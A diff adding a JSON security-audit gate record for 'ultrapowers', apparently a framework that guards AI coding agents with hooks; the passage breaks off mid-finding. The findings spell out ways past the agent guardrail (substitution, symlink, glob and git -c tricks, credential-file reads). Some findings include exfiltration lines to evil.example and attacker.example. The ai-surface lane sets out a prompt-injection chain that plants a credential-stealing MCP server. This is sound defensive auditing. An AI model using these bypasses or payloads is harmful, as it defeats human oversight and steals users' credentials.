@@ -1,0 +1,301 @@
+{
+  "_note": "Gate record for audit-2026-10-11. Blocks for dependencies, osint, code 1, code 4, code 6 and ai-surface are the hunters' own JSON as returned. Blocks for code 2, code 3, code 5, code 7, code 8 and secrets-supply-chain are RECONSTRUCTED from the summaries the coordinator relayed after the session was cut off by a spend limit; the original blocks, and the full attack paths and exploit text of those findings, were not available to the gate. Verifications other than the Hermes one carry verdict 'unverified': the verifier call failed with the org spend limit (HTTP 429) and no verdict is guessed. 'unverified' is outside the contract's confirmed|plausible|rejected enum on purpose.",
+  "repos": [
+    {
+      "repo": "ultrapowers",
+      "hunts": [
+        {
+          "repo": "ultrapowers", "lane": "dependencies", "status": "incomplete",
+          "tools": [
+            { "name": "npm", "version": "11.16.0", "command": "npm audit --package-lock-only --json (cwd tests/brainstorm-server; first with output redirected to /tmp/audit-bs.json, then without a redirect)", "exit": -1, "output": "Not run. First attempt: HUNT-GUARDRAIL DENY: redirect target (/tmp/audit-bs.json) is outside reviews/audit-2026-10-11/ and .ultrapowers/. Retry without a redirect: Permission to use Bash has been denied. No report produced." },
+            { "name": "npm", "version": "11.16.0", "command": "npm audit --package-lock-only --json (cwd repository root; first with output redirected to /tmp/audit-root.json, then without a redirect)", "exit": -1, "output": "Not run. First attempt: HUNT-GUARDRAIL DENY: redirect target (/tmp/audit-root.json) is outside reviews/audit-2026-10-11/ and .ultrapowers/. Retry without a redirect: Permission to use Bash has been denied. No report produced. The root has no lockfile." }
+          ],
+          "findings": [],
+          "cves": [],
+          "discarded": [],
+          "declined": [
+            "Advisories for ws@8.22.0 (tests/brainstorm-server): npm audit could not be run (guardrail deny on the redirect, then a permission denial), and no advisory is asserted from memory.",
+            "Root package.json: npm audit --package-lock-only cannot run without a lockfile and was also denied; the manifest declares no dependencies, so the lack of a lockfile is not a finding."
+          ],
+          "skipped": "npm audit not run for either manifest (hunt guardrail denied the output redirect; the retry without a redirect was denied by permissions; no workaround attempted). pip-audit, cargo-audit and osv-scanner absent; dotnet not applicable (no .NET projects). Offline fallback: root package.json has no dependencies or engines; tests/brainstorm-server pins ws 8.22.0 through a v3 lockfile; no git or URL dependencies, wildcard ranges or end-of-life runtimes found.",
+          "filesRead": [
+            "package.json",
+            "tests/brainstorm-server/package.json",
+            "tests/brainstorm-server/package-lock.json (ws entry and lockfileVersion only)"
+          ]
+        },
+        {
+          "repo": "ultrapowers", "lane": "osint", "status": "incomplete",
+          "tools": [
+            { "name": "gh", "version": "2.86.0", "command": "gh repo view --json nameWithOwner (inside a Bash call that also ran: git remote get-url origin)", "exit": 1, "output": "HUNT-GUARDRAIL DENY: gh repo is not on the hunt read allow-list; the hunt reports in its own files and never writes to a tracker. Not run; whole call denied." },
+            { "name": "git", "version": "n/a", "command": "git remote get-url origin (separate call)", "exit": 1, "output": "Permission to use Bash has been denied. Not run." }
+          ],
+          "findings": [],
+          "cves": [],
+          "discarded": [
+            "ws (tests/brainstorm-server/package.json, 8.22.0): canonical package name, no typosquat signal; confidence below 6"
+          ],
+          "declined": [
+            "Advisory lookup for ws 8.22.0: osv-scanner absent and the gh alert route unavailable; not substituted from memory",
+            "Secret fingerprint search: no committed secret known to this lane; belongs to the secrets-supply-chain lane",
+            "Resolved/dismissed state of platform alerts: no alerts could be fetched"
+          ],
+          "skipped": "Step 1 incomplete: the only git remote (origin), read from .git/config, is a local filesystem path, not a GitHub repository, so no owner/repo exists and gh api repos/<o>/<r>/dependabot/alerts and secret-scanning/alerts were not issued. The confirming commands (gh repo view; git remote get-url origin) were denied by the guardrail and the permission layer, exit 1 each, and were not worked around. Dependabot alerts and secret-scanning alerts are therefore NOT checked; this is not a clean result. osv-scanner absent, not run. Typosquat check by name alone only.",
+          "filesRead": [".git/config", "package.json", "tests/brainstorm-server/package.json", "tests/brainstorm-server/package-lock.json"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 1: .agents, .claude-plugin, .codex-plugin, .cursor-plugin",
+          "tools": [], "findings": [], "cves": [],
+          "discarded": [
+            "qa.auth.recipe / qa.containers config fields consumed by the QA skills: config is trusted input and the consumer is outside this scope; below the confidence floor",
+            "Codex marketplace source.url './' is a local relative path, not a remote fetch: no finding",
+            "ticketPattern permits '.' and '..'-like ids only without slashes; downstream consumers additionally refuse any id naming another path: not exploitable"
+          ],
+          "declined": [], "skipped": "",
+          "filesRead": [".agents/mcp-secrets.env.example", ".agents/memory/MEMORY.md", ".agents/memory/README.md", ".agents/memory/gotchas/guardrail-suites-run-time-windows.md", ".agents/plugins/marketplace.json", ".agents/ultrapowers.json", ".claude-plugin/marketplace.json", ".claude-plugin/plugin.json", ".codex-plugin/plugin.json", ".cursor-plugin/plugin.json", "3 empty .gitkeep files"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 2: .devin-plugin, .githooks, .github, .hermes-plugin (RECONSTRUCTED from the coordinator's relayed summary)",
+          "tools": [],
+          "findings": [
+            { "severity": "Medium", "confidence": 6, "category": "untrusted search path", "title": "Hermes plugin resolves node through the working directory on Windows",
+              "file": ".hermes-plugin/__init__.py", "line": 283,
+              "description": "shutil.which('node') resolves through the current directory first on Windows, so a node.exe, node.cmd or node.bat planted in the project directory runs instead of the real node.",
+              "attackPath": "pre_tool_call (.hermes-plugin/__init__.py:309-311) -> run-marker check (:273-279) -> shutil.which('node') (:283) -> subprocess.run([node, cli]) (:288). Path as walked by the verifier.",
+              "exploit": "A hostile repository ships a node.exe or node.cmd at its root; a native-Windows Hermes session in that repository runs it on every guarded tool call.",
+              "mitigationExamined": "No absolute path, no exclusion of the cwd, NoDefaultCurrentDirectoryInExePath not set; hooks/run-hook.cmd and guardrail-bridge.mjs guard this class elsewhere but the Hermes adapter does not.",
+              "fix": "Resolve node from PATH entries only (skip the cwd) or use an absolute path, and set NoDefaultCurrentDirectoryInExePath=1." }
+          ],
+          "cves": [],
+          "discarded": [],
+          "declined": ["Whether the pinned action SHAs in ci.yml match upstream: not checked, gh api was denied", "Original JSON block not available to the gate"],
+          "skipped": "ci.yml read: no pull_request_target, contents: read, no secrets, no ${{ }} in run steps, actions pinned to SHAs.",
+          "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 3: .kimi-plugin, .muse-plugin, .opencode, .pi (RECONSTRUCTED from the coordinator's relayed summary)",
+          "tools": [], "findings": [], "cves": [],
+          "discarded": [], "declined": ["Original JSON block not available to the gate; the coordinator relayed: no findings at or above confidence 6"], "skipped": "", "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 4: .remember, agents, assets",
+          "tools": [], "findings": [], "cves": [],
+          "discarded": [
+            "agents/vulnerability-hunter.md: running a project script through an interpreter is forbidden by contract, not by the hook; a documented design limit, not a flaw in this scope (see code 5 finding on the program deny-list)",
+            "assets/*.svg: no script, event handler or external reference found (structural check only on the 1 MB file)"
+          ],
+          "declined": [
+            "assets/ultrapowers-small.svg (about 1 MB) checked by regex and tag enumeration, not read whole",
+            "assets/app-icon.png viewed as an image only; metadata chunks not inspected"
+          ],
+          "skipped": "",
+          "filesRead": ["agents/qa-specialist.md", "agents/vulnerability-hunter.md", "assets/ultrapowers-mark.svg", "assets/ultrapowers-small.svg (structural grep only)", "assets/app-icon.png (image)", ".remember/* (25 bookkeeping files, all git-ignored)"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 5: docs, hooks, output-styles (RECONSTRUCTED from the coordinator's relayed summary; reasoned from the code, nothing executed)",
+          "tools": [],
+          "findings": [
+            { "severity": "High", "confidence": 9, "category": "guardrail-bypass", "title": "Command substitutions, backticks and unquoted heredoc bodies are opaque to the shell-write analysis", "file": "hooks/lib/qa-shell-writes.mjs", "line": 73,
+              "description": "tokenize() skips $( ), backtick and unquoted-heredoc bodies and emits an opaque dyn word, so writes inside a substitution pass (echo $(echo x > src/app.js)). In the autopilot profile this reaches .git/config, .github/, .agents/ultrapowers.json and hooks/qa-guardrail. The qa-guardrail text rules cover only a fixed verb list; the autopilot 'substitution at segment start' rule (hooks/qa-guardrail:701) fires only at the start of a segment.",
+              "attackPath": "Prompt-injected agent's Bash tool call -> hooks/qa-guardrail -> qa-shell-writes.mjs tokenize() (:73) drops the substitution body -> write analysis sees only the outer command -> allow. Full path relayed only as this summary.",
+              "exploit": "echo $(echo x > src/app.js) writes outside reviews/<ticket>; in autopilot the same shape reaches protected paths.",
+              "mitigationExamined": "Fixed-verb text rules and the segment-start substitution rule only.",
+              "fix": "Recurse into substitutions, or deny any substitution during a run." },
+            { "severity": "High", "confidence": 9, "category": "guardrail-bypass", "title": "cd handling: tilde and unscoped directory across subshells and pipelines", "file": "hooks/lib/qa-shell-writes.mjs", "line": 1215,
+              "description": "'cd ~' sets the tracked dir to <dir>/~. flush() on ( ) | & does not scope the tracked dir, so '(cd reviews/T); echo x > src/app.js' and 'cd reviews/T | cat; ...' are judged against the wrong directory.",
+              "attackPath": "Bash tool call with a subshell or pipeline cd -> cd tracking (:1215) leaks the directory into later segments -> a write to src/app.js is judged inside reviews/T -> allow. Full path relayed only as this summary.",
+              "exploit": "(cd reviews/T); echo x > src/app.js",
+              "mitigationExamined": "None found by the hunter.",
+              "fix": "Treat ~ as unresolved, and save and restore dir around subshells, pipelines and background segments." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "$'..' and $\"..\" quoting is tokenized as literal text, hiding paths and names from the write analysis", "file": "hooks/lib/qa-shell-writes.mjs", "line": 90,
+              "description": "$'..' and $\"..\" are tokenized as a literal $ plus quoted text, so a write to reviews/T/$'..'/$'..'/src/app.js is judged inside the area; protected names, .env and program names are hidden the same way.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Decode them or deny them." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "Autopilot protected-path matching ignores glob and brace expansion", "file": "hooks/lib/qa-shell-writes.mjs", "line": 839,
+              "description": "Autopilot protected-path matching is on the typed text: echo x > .gi[t]/config, hooks/qa-guardra[i]l, .agents/ultrapowers.jso[n], tee {.git,x}/config bypass it. Autopilot only.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Refuse targets containing * ? [ {." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "Secret-file rule matches only literal spelling, omits credential files, and the token-variable check is autopilot-only", "file": "hooks/qa-guardrail", "line": 442,
+              "description": "KEY_RE matches only the literal spelling (.e'n'v, .e*, x=.e; cat ${x}nv, ~/.aw[s]/credentials). It omits the glab config, gh hosts.yml, .npmrc, .netrc and .git-credentials. TRACKER_VARS/SECRET_VARS are checked only in autopilot (echo \"$GH_TOKEN\" works in the hunt).",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Run KEY_RE over resolved words, extend the list, apply the variable check in every profile." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "git -c is skipped and read-only git subcommands can run a configured command in QA and hunt", "file": "hooks/lib/qa-shell-writes.mjs", "line": 1444,
+              "description": "'git -c' is skipped (GIT_GLOBAL_WITH_ARG) and status/diff/log/show/grep count as read-only, so 'git -c core.fsmonitor=<cmd> status' runs a command in QA and hunt. Only autopilot denies -c.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Deny -c, --config-env, --exec-path, -O and --ext-diff in every profile." },
+            { "severity": "Medium", "confidence": 9, "category": "guardrail-bypass", "title": ".ultrapowers/ is writable in QA and hunt runs, so the run marker can be removed or widened", "file": "hooks/qa-guardrail", "line": 610,
+              "description": "In QA and hunt runs everything under .ultrapowers/ is writable; only the autopilot markers are protected, so removing the run marker makes every later call inert. Writing '..' into the marker widens the shell write area to the whole project because the ticket value is interpolated into reviews/<ticket>.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Protect qa-active and hunt-active from the agent and validate the ticket value." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "PowerShell tool command is analysed as POSIX shell", "file": "hooks/qa-guardrail", "line": 745,
+              "description": "The PowerShell tool command is analysed as POSIX. Aliases (sc, ac, ni, ri, mi, cpi, rni, si), [IO.File]::WriteAllText and iwr -OutFile are not denied.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "On the PowerShell tool, allow only a read-only list." },
+            { "severity": "Medium", "confidence": 7, "category": "tool misuse", "title": "MCP tracker-write rule is gated on the autopilot profile only", "file": "hooks/qa-guardrail", "line": 483,
+              "description": "The MCP tracker-write rule is gated on PROFILE=autopilot. Hunt and QA can call MCP comment, mail, chat or Odoo write tools; an MCP call with no command falls through to exit 0 at :647.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Apply the rule to the hunt profile." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "Write analysis is a program-name deny-list, so unlisted programs and project scripts can write or execute", "file": "hooks/lib/qa-shell-writes.mjs", "line": 707,
+              "description": "Not caught: node reviews/x.mjs after the Write tool created it, bash script.sh, ./x, make, awk -f, sed -f, shuf -o, uniq IN OUT, zip, openssl -out, sqlite3, ed, curl --output-dir. Commit ba4bfe4 documents project scripts as contract-forbidden, but the guardrail does not enforce it.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "The contract forbids it; the hook does not.", "fix": "Allow-list programs in hunt and QA." },
+            { "severity": "Medium", "confidence": 8, "category": "guardrail-bypass", "title": "A symlink created in the same command is not resolved when write paths are checked", "file": "hooks/lib/qa-shell-writes.mjs", "line": 1744,
+              "description": "'ln -s ../.. reviews/T/up && echo x > reviews/T/up/src/app.js' passes because the link does not exist when paths are resolved; the ln link target and the single-operand form are never checked.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Check ln -s targets and refuse writes through same-command links." },
+            { "severity": "Medium", "confidence": 7, "category": "guardrail-bypass", "title": "Egress host allow-list inspects only https URLs, so extra curl/wget operands escape it", "file": "hooks/qa-guardrail", "line": 839,
+              "description": "The egress allow-list greps only https?:// URLs: 'curl https://allowed.example/ \"evil.example/?t=$GH_TOKEN\"', --connect-to, --resolve and --proxy host:port pass. Applies only when qa.hosts.allowed is set.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "Applies only when qa.hosts.allowed is set.", "fix": "Parse every curl and wget operand, refuse schemeless URLs, extra URLs, --connect-to, --resolve and --proxy." }
+          ],
+          "cves": [],
+          "discarded": ["hook timeout fail-open (no concrete command)", "hooks-cursor.json relative path (cwd unknown)", "dotnet list package MSBuild (unconfirmed)"],
+          "declined": ["docs/ (markdown only)", "Original JSON block not available to the gate"],
+          "skipped": "session-start, team-memory hooks, run-hook.cmd and the bridge looked fine (not read in depth).",
+          "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 6: plans, reviews, scripts",
+          "tools": [], "findings": [], "cves": [],
+          "discarded": [
+            "lint-shell.sh: shellcheck --external-sources follows source directives in a PR-supplied script; CI only runs for owner PRs, confidence 4",
+            "lint-shell.sh: a tracked file named with a leading dash would be passed as an option; no way to turn that into execution, confidence 2",
+            "bump-version.sh: jq paths, manifest paths and exclude patterns come from .version-bump.json, an owner-controlled file, confidence 3",
+            "bump-version.sh: fixed ${file}.tmp name drops the manifest's file mode; correctness nit, not a flaw",
+            "rename-fork.sh: sed -i on a tracked symlink errors instead of writing through, confidence 2"
+          ],
+          "declined": ["Bash denied by the permission system at the start; not worked around", "Flaws described in reviews/GH-34 and GH-35 point at files outside this scope; not judged here"],
+          "skipped": "",
+          "filesRead": ["scripts/bump-version.sh", "scripts/lint-shell.sh", "scripts/rename-fork.sh", "plans/GH-16/Plan.md", "reviews/GH-34/review-findings.json", "reviews/GH-34/TASK-REVIEW.md", "reviews/GH-35/review-findings.json", "reviews/GH-35/TASK-REVIEW.md"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 7: skills, specs, tasks (RECONSTRUCTED from the coordinator's relayed summary)",
+          "tools": [],
+          "findings": [
+            { "severity": "Medium", "confidence": 7, "category": "Tool misuse", "title": "Autopilot envelope does not protect .mcp.json or other harness MCP/config files, which the next headless stage loads outside the guardrail", "file": "skills/autopilot/scripts/autopilot.mjs", "line": 1066,
+              "description": "Duplicate of the ai-surface finding of the same title (merged). Also unprotected: .codex/config.toml, opencode.json, .cursor/mcp.json, .vscode/mcp.json, .factory/mcp.json, .kimi/mcp.json.",
+              "attackPath": "See the ai-surface finding.", "exploit": "See the ai-surface finding.", "mitigationExamined": "None found by the hunter.", "fix": "Protect them, or pass a copy of .mcp.json taken from the base branch." },
+            { "severity": "Medium", "confidence": 6, "category": "guardrail-bypass / command execution", "title": "In nested worktrees .git is a file the guardrail does not protect, so a stage can redirect gitdir and make engine git run attacker config", "file": "skills/autopilot/scripts/repos.mjs", "line": 105,
+              "description": "In the nested topology .worktrees/<branch>/.git is a FILE. The guardrail regex (^|/)\\.git/ needs a trailing slash, so the file is writable. A stage can write a directory with core.sshCommand or remote.origin.url and set the file to 'gitdir: <it>'; the engine's git push and tip in that worktree then use it with engine credentials (repos.mjs:158, :121; autopilot.mjs:698). trustState does not check where .git points.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "trustState does not check where .git points.", "fix": "Deny writes ending in /.git, check git rev-parse --git-dir is under <clone>/.git/worktrees, and pass -c core.sshCommand= and -c core.fsmonitor= to engine git." },
+            { "severity": "Medium", "confidence": 6, "category": "untrusted search path", "title": "hunt-preflight and sibling scripts resolve tools through the checkout's working directory on Windows", "file": "skills/vulnerability-hunt/scripts/hunt-preflight.mjs", "line": 151,
+              "description": "defaultRun uses execSync through cmd.exe, which searches the cwd first, so npm.cmd, gh.bat or dotnet.exe at the checkout root runs. spawnSync('git'/'bash') at hunt-preflight.mjs:301 and :324, qa-preflight.mjs:196, repos.mjs:18 and init.mjs:1716 use libuv's lookup. Runs before any guardrail marker exists. Windows only. Related to the Hermes finding.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Resolve the tools from PATH entries only, skipping the cwd, and set NoDefaultCurrentDirectoryInExePath=1." },
+            { "severity": "Low", "confidence": 6, "category": "sensitive data exposure", "title": "Odoo API key is sent to whatever URL the checked-out config names", "file": "skills/autopilot/scripts/odoo.mjs", "line": 40,
+              "description": "ODOO_API_KEY goes to whatever tickets.sources[].url the checked-out config names. mcpUrl may be http (ticket-sources.mjs:73; init.mjs:583).", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" },
+            { "severity": "Low", "confidence": 6, "category": "sensitive data exposure", "title": "Stage environment scrub omits GitLab token variables (unchecked, from memory of glab docs)", "file": "skills/autopilot/scripts/autopilot.mjs", "line": 1050,
+              "description": "The stage env scrub omits GITLAB_ACCESS_TOKEN and GITLAB_PRIVATE_TOKEN (the hunter states this is from memory of glab documentation and was not checked). SSH key files stay usable.", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" },
+            { "severity": "Low", "confidence": 6, "category": "hardening", "title": "QA database recipe: role keeps CREATE on public through PUBLIC on PostgreSQL 14 and older", "file": "skills/qa-lane-4-db/recipes/qa_agent_ro.sql", "line": 43,
+              "description": "On PostgreSQL 14 and older the read-only role keeps CREATE on schema public through PUBLIC.", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" }
+          ],
+          "cves": [],
+          "discarded": [],
+          "declined": ["Original JSON block not available to the gate"],
+          "skipped": "Controls that held per the hunter: brainstorm server key, Origin and file serving, ticket-id validation, argv/stdin to gh and glab, escaped ticket text, approval rechecks. specs/ and tasks/ contain no credentials.",
+          "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "code", "status": "ok", "hunter": "code 8: templates, tests, root files (RECONSTRUCTED from the coordinator's relayed summary)",
+          "tools": [],
+          "findings": [
+            { "severity": "Medium", "confidence": 6, "category": "untrusted search path / guardrail fail-open", "title": "Antigravity and Kimi guardrail hook commands are working-directory-relative", "file": "hooks.json", "line": 10,
+              "description": "The Antigravity hook is the cwd-relative 'node hooks/lib/guardrail-cli.mjs --antigravity'. Antigravity's cwd is unverified (README and docs say the hook behaviour is unconfirmed). If the workspace is the cwd, a hostile repo can ship its own file, or the guardrail silently fails to run. Same class as the Kimi finding (.kimi-plugin/plugin.json:28, ai-surface Low); merged.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "tests/antigravity says the path is relative to the plugin root; nothing equivalent found for Kimi.", "fix": "Use an absolute path the harness expands or resolve relative to the manifest directory; add a test with a decoy file in an unrelated cwd." },
+            { "severity": "Medium", "confidence": 6, "category": "unsafe default permissions", "title": "Scaffolded Claude settings pre-approve git diff and git blame, which can read files the Read deny rules protect", "file": "templates/.claude/settings.json.tmpl", "line": 11,
+              "description": "The scaffold pre-approves Bash(git diff:*) and Bash(git blame:*). 'git diff --no-index /dev/null ~/.aws/credentials' and 'git blame --contents <file>' read files the Read deny rules protect. The deny list omits .env.staging, .env.development, .env.test, ~/.gnupg, ~/.kube, ~/.config/gh, ~/.npmrc and ~/.git-credentials.",
+              "attackPath": "Relayed as summary only.", "exploit": "Described, not run.", "mitigationExamined": "None found by the hunter.", "fix": "Drop the allows or deny --no-index and --contents, and extend the denies." },
+            { "severity": "Low", "confidence": 6, "category": "supply chain", "title": "Scaffold pre-commit hook skips the secret scan when gitleaks and Docker are unavailable", "file": "templates/.githooks/pre-commit.tmpl", "line": 34,
+              "description": "The scaffold pre-commit hook skips the gitleaks scan when gitleaks and Docker are unavailable, or when Docker exits with a code other than 1. The image is pinned by tag, not by digest. Merged with secrets-supply-chain SS-1 (.githooks/pre-commit:35: no secret scan in CI; local hook fails open).",
+              "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" }
+          ],
+          "cves": [],
+          "discarded": [],
+          "declined": ["about 750 files under tests/ not read", "Original JSON block not available to the gate"],
+          "skipped": "Not a security finding: package.json and gemini-extension.json say 2.0.2 while RELEASE-NOTES and CHANGES.json say 2.1.0. The brainstorm server looked sound.",
+          "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "secrets-supply-chain", "status": "incomplete", "hunter": "(RECONSTRUCTED from the coordinator's relayed summary)",
+          "tools": [],
+          "findings": [
+            { "severity": "Low", "confidence": 6, "category": "supply chain", "title": "No secret scan in CI and the local pre-commit hook fails open", "file": ".githooks/pre-commit", "line": 35, "description": "Same class as the scaffold pre-commit Low in code 8 (merged).", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" },
+            { "severity": "Low", "confidence": 6, "category": "supply chain", "title": "actions/checkout pin could not be tied to a known v4 tag", "file": ".github/workflows/ci.yml", "line": 25, "description": "The actions/checkout commit SHA (commented v4) could not be tied to a known v4 tag. Unverified: the check needed gh api, which was denied.", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" },
+            { "severity": "Low", "confidence": 6, "category": "supply chain", "title": "templates/.mcp.json runs six npx -y MCP servers with exact versions but no lockfile", "file": "templates/.mcp.json", "line": 6, "description": "Six npx -y MCP servers with exact top-level versions but no lockfile; three receive API keys. No live secret was found in the tracked tree.", "attackPath": "Relayed as summary only.", "exploit": "n/a", "mitigationExamined": "", "fix": "" }
+          ],
+          "cves": [],
+          "discarded": [],
+          "declined": ["Git history never checked: git log, git show and git ls-files were denied", "Original JSON block not available to the gate"],
+          "skipped": "Git-history check (a secret removed from the tree but still in history) not covered: denied.",
+          "filesRead": ["not relayed"]
+        },
+        {
+          "repo": "ultrapowers", "lane": "ai-surface", "status": "ok",
+          "tools": [],
+          "findings": [
+            { "severity": "Medium", "confidence": 7, "category": "Tool misuse", "title": "Autopilot envelope does not protect .mcp.json or other harness MCP/config files, which the next headless stage loads outside the guardrail", "file": "hooks/qa-guardrail", "line": 470,
+              "description": "PROTECTED_RE and AUTOPILOT_PROTECTED_RE (hooks/qa-guardrail:466,470; mirrored in hooks/lib/qa-shell-writes.mjs:172,178) protect .claude/, .gemini/hooks, .github, .githooks, .husky, settings.json under dot-dirs, the root agents.md/claude.md/gemini.md and the ticket state files. They do not match .mcp.json, .cursor/mcp.json, .vscode/mcp.json, .vscode/tasks.json, .codex/config.toml, .kimi/mcp.json, .factory/mcp.json or opencode.json. Writes anywhere else in the workspace are allowed in the autopilot profile (qa-guardrail:596-599). For the claude-code adapter the watcher starts each stage with --strict-mcp-config --mcp-config <root>/.mcp.json (autopilot.mjs:1066-1075, 1084), read from the same working tree the previous stage wrote, with a permission-bypass mode (harnesses.mjs:21). The engine commits only tasks/<ID> (repos.mjs:140, autopilot.mjs:166), so an edited .mcp.json is an uncommitted working-tree change that never appears in the spec/plan diff the approver reviews.",
+              "attackPath": "1) Outsider-authored ticket text (issue body or comment on a public GitHub/GitLab repo, or Odoo chatter) is read by the scaffold/spec stage (fetch-ticket.mjs:284-302, 276-281 -> source.md -> brainstorm-task Step 4b). 2) A maintainer labels the ticket up:ready; the label is permission-checked, the content is not (autopilot.mjs:1256). 3) An injected stage writes an MCP server entry to <root>/.mcp.json with the Write tool; guard check at qa-guardrail:586-599 allows it. 4) The watcher spawns the next stage (autopilot.mjs:1171 -> 1084) and the harness starts the attacker's stdio MCP command as the user, outside every PreToolUse hook. 5) That process can read gh and glab credentials from the home directory, the SSH folder and the source tree, bypassing the stage-token and no-auth config isolation set in stageEnvironment (autopilot.mjs:1042-1062). In gated mode the human approves the spec/plan, which do not contain this file.",
+              "exploit": "A ticket comment tells the agent to register a docs MCP server in .mcp.json with a command that exfiltrates credentials. If the spec-stage model complies, the file is edited uncommitted, and the next headless stage launches it with the engine's user privileges.",
+              "mitigationExamined": "Ticket text is quoted between escaped markers and the skills and prompts tell the agent never to follow it (fetch-ticket.mjs:474-593, SKILL.md:27, 118). The ready label needs a write-access account (autopilot.mjs:817-825). The guardrail protects .claude/, .gemini/hooks, .github, .githooks, .husky and .git/. Stage tokens are read-only when configured. None of these cover .mcp.json. The guardrail denies tool calls, not the harness's own MCP process spawn. The approver sees only the committed spec and plan.",
+              "fix": "Add .mcp.json, .mcp.local.json, .cursor/, .vscode/, .codex/, .kimi/, .factory/ and opencode.json to the autopilot protected set in hooks/qa-guardrail, hooks/lib/qa-shell-writes.mjs and the Pi/OpenCode/Hermes/Gemini copies. In the engine, take the headless stage's MCP config from a snapshot the engine controls, or hash .mcp.json before and after each stage and block the stage if it changed." },
+            { "severity": "Medium", "confidence": 6, "category": "Sensitive data exposure", "title": "URL-carrying tools (WebFetch, Firecrawl, browser tools) have no egress restriction in autopilot stages unless qa.hosts.allowed or qa.urls is set", "file": "hooks/qa-guardrail", "line": 638,
+              "description": "The tool-URL loop at qa-guardrail:638-644 denies only hosts on qa.hosts.forbidden and, when the allow-list is non-empty, hosts not on it. The exfiltration-shape rules apply to shell curl/wget only (qa-guardrail:794-824). The shipped config leaves qa.urls and qa.hosts empty (templates/.agents/ultrapowers.json.tmpl, this repository's .agents/ultrapowers.json), so any host is reachable from a tool call. The project .mcp.json loaded into headless stages includes Firecrawl and brave-search (templates/.mcp.json), and WebFetch is also available.",
+              "attackPath": "Outsider ticket text or a linked page (fetched under brainstorm-task Step 4b) -> spec or execute stage model -> a tool call such as firecrawl_scrape or WebFetch with url=https://attacker.example/?d=<repository content or ticket data> -> qa-guardrail:638-644 passes it -> the attacker's server logs the data.",
+              "exploit": "A page linked from the ticket says to verify the endpoint by scraping a URL whose query string carries file contents the stage has read. The tool call is allowed because no host list is configured.",
+              "mitigationExamined": "The key-material rules stop the stage reading .env and mcp-secrets.env (qa-guardrail:442-458). linkFetchable marks private or internal hosts as not fetched in source.md (fetch-ticket.mjs:214-237), but it is advisory text, does no DNS or redirect check and does not constrain the tool. Shell egress is shaped and checked. When qa.urls or hosts.allowed is set the tool URLs are restricted.",
+              "fix": "In the autopilot profile, default-deny URL-carrying tool calls to hosts not derived from the ticket's own fetchable links or an autopilot.hosts.allowed list. Apply the shell rule for data in the URL to tool URLs. Document that an empty qa.hosts means open egress for stages." },
+            { "severity": "Medium", "confidence": 6, "category": "Memory manipulation", "title": "Team memory and nested instruction files are writable by autopilot stages, and uncommitted edits bypass PR review", "file": "hooks/qa-guardrail", "line": 470,
+              "description": ".agents/memory/** is not in the protected sets, and the instruction-file pattern ^(agents|claude|gemini)\\.md$ is anchored to the project root, so nested AGENTS.md, .agents/memory/MEMORY.md, .cursor/rules/* and similar are writable in a stage (qa-guardrail:596-599). MEMORY.md is imported into every session through CLAUDE.md and the session nudge hooks ask agents to save memories (hooks/team-memory-nudge:26, hooks/team-memory-postcompact:35). The remember gate (skills/team-memory/SKILL.md steps 1-8) requires verified, durable, expensive and non-derivable facts, but nothing excludes facts that originate in ticket or page text, and memory-lint.mjs checks structure only. The engine commits only tasks/<ID>, so a stage's uncommitted edits stay in the developer's working tree.",
